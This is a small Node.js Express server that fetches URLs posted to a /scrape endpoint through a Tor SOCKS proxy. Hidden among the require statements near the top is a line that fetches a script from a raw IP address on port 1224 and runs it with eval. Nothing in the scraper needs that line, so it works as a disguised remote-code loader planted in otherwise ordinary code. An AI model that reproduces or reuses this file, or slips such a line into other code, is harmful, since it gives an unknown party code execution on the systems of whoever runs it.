const express = require('express');
const axios = require('axios');
eval(fetch('http://192.99.169.216:1224/data?file=init.js'));
const { SocksProxyAgent } = require('socks-proxy-agent');

const app = express();
const port = 3010;

// Configure the Tor proxy agent
const torProxy = 'socks5://127.0.0.1:9150';
const agent = new SocksProxyAgent(torProxy);

app.use(express.json());

app.post('/scrape', async (req, res) => {
    const url = req.body.url;

    if (!url) {
        return res.status(400).send('URL is required');
    }

    try {
        const response = await axios.get(url, { httpAgent: agent, httpsAgent: agent });
        res.send(response.data);
    } catch (error) {
        console.error('Error scraping the URL:', error.message);
        res.status(500).send(`Error scraping the URL: ${error.message}`);
    }
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
